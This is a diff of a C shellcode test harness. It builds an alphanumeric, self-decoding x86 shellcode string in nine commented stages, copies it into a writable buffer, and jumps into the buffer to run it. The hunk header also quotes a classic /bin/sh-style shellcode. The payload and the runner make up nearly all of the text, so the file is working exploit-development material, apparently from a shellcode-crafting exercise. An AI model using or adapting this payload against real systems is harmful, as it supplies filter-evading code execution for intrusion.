@@ -18,18 +18,23 @@ char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\
 
 */
 
+#include <string.h>
+
 int main(void) {
 
     // P1, P2, ...: see DRAFT.md
-    char *shellcode = "j0XHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHPY"   // P1
-                      "PZ"                                                      // P2    
-                      "R"                                                       // P3
-                      "j0X5JCCX5Ul00P"                                          // P4
-                      "j0X5JRYY5U007PT"                                         // P5
-                      "j0XHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH5CG005q800P"  // P6
-                      "j0X5kOOOPP"                                              // P7
-                      "j0XHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH"                // P8
-                      "DDDDDDDDDDDD";                                               //P9
+    char shellcode[4096] = {0};
+    char *_sc  = "j0XHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHPY"   // P1
+                 "PZ"                                                      // P2    
+                 "R"                                                       // P3
+                 "j0X5JCCX5Ul00P"                                          // P4
+                 "j0X5JRYY5U007PT"                                         // P5
+                 "j0XHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH5CG005q800P"  // P6
+                 "j0X5kOOOPP"                                              // P7
+                 "j0XHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH"                // P8
+                 "DDDDDDDDDDDD"                                            // P9
+                 "\xccu\x80";                                                     //
+    strcpy(shellcode, _sc);
 
     (*(void(*)()) shellcode)();
 }
